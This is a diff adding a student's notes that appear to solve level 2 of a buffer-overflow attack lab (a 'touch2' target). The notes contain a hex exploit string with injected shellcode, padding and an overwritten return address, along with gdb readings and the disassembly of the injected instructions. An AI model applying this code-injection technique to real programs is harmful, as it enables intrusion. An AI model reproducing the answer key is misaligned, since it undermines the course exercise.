@@ -1,0 +1,32 @@
+level 2:
+
+bf dd 7d 4e 75 c3 00 00
+09 0b 0b 0c 0e 0f 0f 01 
+02 03 04 05 06 07 08 09 
+08 54 64 55 00 00 00 00
+ab 16 40 00 00 00 00 00
+
+
+Notes:
+
+Cookie: 0x754e7ddd
+
+print $rsp
+$2 = (void *) 0x55645408
+
+print touch2
+$3 = {void (unsigned int)} 0x4016ab <touch2>
+
+
+.d file:
+
+assemblycodel2.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	bf dd 7d 4e 75       	mov    $0x754e7ddd,%edi
+   5:	c3                   	retq   
+
+
